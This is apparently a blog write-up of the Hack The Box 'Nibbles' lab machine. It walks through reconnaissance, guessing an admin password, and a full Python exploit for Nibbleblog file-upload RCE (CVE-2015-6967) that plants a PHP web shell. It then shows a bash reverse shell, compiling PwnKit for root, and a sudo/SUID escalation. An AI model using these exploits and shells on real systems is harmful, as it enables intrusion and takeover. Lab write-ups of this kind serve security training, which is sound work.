---
layout: single
title: Nibbles - Hack The Box
excerpt: "Nibbles is a fairly simple machine, however with the inclusion of a login blacklist, it is a fair bit more challenging to find valid credentials. Luckily, a username can be enumerated and guessing the correct password does not take long for most."
date: 2025-05-31
classes: wide
header:
  teaser: /img2/nibbles.png
  teaser_home_page: true
  icon: /img2/images/hackthebox.webp
categories:
  - hackthebox
  - Linux
  - Easy
tags:
  - Abusing Nibbleblog - Remote Code Execution via File Upload
  - SUID Binary Exploitation [Privilege Escalation] (OPTION 1)
  - Abusing Sudoers Privilege [Privilege Escalation] (OPTION 2)
---


## Reconnaissance

- Nmap

```bash
nmap --open -p- --min-rate 5000 -vvv -n -Pn 10.10.10.75
```

![](/img2/Pasted%20image%2020250531145003.png)

- Hidden directory

![](/img2/Pasted%20image%2020250531145217.png)

- Whatweb 

```bash
whatweb http://10.10.10.75/nibbleblog/
```

![](/img2/Pasted%20image%2020250531145330.png)

- Gobuster

```bash
gobuster dir -u http://10.10.10.75/nibbleblog/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 50
```

![](/img2/Pasted%20image%2020250531164602.png)

![](/img2/Pasted%20image%2020250531165907.png)

![](/img2/Pasted%20image%2020250531165953.png)

![](/img2/Pasted%20image%2020250531170043.png)

- Gobuster to search php files

```bash
gobuster dir -u http://10.10.10.75/nibbleblog/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 50 -x php
```

![](/img2/Pasted%20image%2020250531170158.png)

## Exploitation

- Test passwords in admin panel

![](/img2/Pasted%20image%2020250531184844.png)

> We can test: admin, nibble, nibbleblog, nibbles.

> Password --> nibbles

- Nibbleblog 4.0.3 File Upload Authenticated Remote Code Execution (RCE) (CVE 2015-6967)

```python
import argparse
import requests

class Nibbleblog():
    def __init__(self,target,username,password,rce):
        self.target = target
        self.username = username
        self.password = password
        self.cmd = rce
        self.upload()

    def upload(self):
        requests.packages.urllib3.disable_warnings()
        payload = "<?php echo system($_REQUEST['rse']); ?>"
        session = requests.Session()
        login_data = {
            'username':self.username,'password':self.password,'login':''
        }
        print("Loggin in to " + self.target)
        req_url_login = session.post(self.target,data=login_data,verify=False)
    
        file_data = {
            "plugin":"my_image",
            "title":"blah",
            "position":"4",
            "caption":"test",
        }

        file_content = {
            'rse':('rse.php',payload,'application/x-php',{'Content-Disposition':'form-data'}),
        }

        url_upload = self.target + "?controller=plugins&action=config&plugin=my_image"
        req_url_upload = session.post(url_upload,data=file_data,files=file_content,verify=False)
        if req_url_upload.status_code == 200:
            print("Logged in and was able to upload exploit!")
            self.rce()
        else:
            print("Something went wrong with the upload!")
            exit()

    def rce(self):
        requests.packages.urllib3.disable_warnings()
        url_shell = self.target.replace("/admin.php","/content/private/plugins/my_image/rse.php")
        print("Payload located in " + url_shell)
        if args.shell:
            while True:
                try:
                    cmd = input("RCE: ")
                    
                    rce_data = {
                        'rse':cmd
                    }
                    req_url_rce = requests.post(url_shell,data=rce_data,verify=False)
                    print(req_url_rce.text)
                except KeyboardInterrupt:
                    print("Bye Bye\n")
                    exit()

        if args.rce:
            rce_data = {
                'rse':self.cmd
            }
            req_url_rce = requests.post(url_shell,data=rce_data,verify=False)
            print(req_url_rce.text)

if __name__ == "__main__":
    print("Nibbleblog 4.0.3 File Upload Authenticated Remote Code Execution")
    parser = argparse.ArgumentParser(description='Nibbleblog 4.0.3 File Upload Authenticated Remote Code Execution')

    parser.add_argument('-t', metavar='<Target admin URL>', help='admin target/host URL, E.G: http://nibblesrce.com/blog/admin.php', required=True)
    parser.add_argument('-u', metavar='<user>', help='Username', required=True)
    parser.add_argument('-p', metavar='<password>', help="Password", required=True)
    parser.add_argument('-rce', metavar='<Remote Code Execution>', help='-rce whoami', required=False)
    parser.add_argument('-shell',action='store_true',help='Pseudo-Shell option for continous rce', required=False)
    args = parser.parse_args()

    Nibbleblog(args.t,args.u,args.p,args.rce)
```

```bash
python3 exploit.py -t http://10.10.10.75/nibbleblog/admin.php -u admin -p nibbles -rce whoami
```

![](/img2/Pasted%20image%2020250531185738.png)

- Manual Explotation

```php
<?php
  system("whoami"); 
?>
```

![](/img2/Pasted%20image%2020250531190847.png)

![](/img2/Pasted%20image%2020250531191028.png)

- Send reverse shell

![](/img2/Pasted%20image%2020250531190847.png)

```php
<?php
  system("bash -c 'bash -i >& /dev/tcp/10.10.16.7/9000 0>&1'");
?>
```

![](/img2/Pasted%20image%2020250531191751.png)

```bash
nc -nlvp 9000
```

## Post-exploitation (OPTION 1)

- Find sudoers

```bash
find / -perm -4000 2>/dev/null 
```

![](/img2/Pasted%20image%2020250531193152.png)

- CVE-2021-4034 (Pkexec Local Privilege Escalation)

```bash
wget https://github.com/ly4k/PwnKit/blob/main/PwnKit.c
python3 -m http.server
```

```bash
wget http://10.10.16.7/PwnKit.c
gcc -shared PwnKit.c -o PwnKit -Wl,-e,entry -fPIC
./PwnKit
```

## Post-exploitation (OPTION 2)

- Check sudoers

```bash
sudo -l
```

![](/img2/Pasted%20image%2020250601173610.png)

- Check /home/nibbler/personal/stuff/monitor.sh file

```bash
cat /home/nibbler/personal/stuff/monitor.sh
```

![](/img2/Pasted%20image%2020250601173714.png)

> No such file

- Create monitor.sh

```bash
mkdir -p /home/nibbler/personal/stuff && echo "chmod u+s /bin/bash" > /home/nibbler/personal/stuff/monitor.sh && chmod +x /home/nibbler/personal/stuff/monitor.sh && sudo /home/nibbler/personal/stuff/monitor.sh && bash -p
```


![](/img2/Pasted%20image%2020250531192853.png)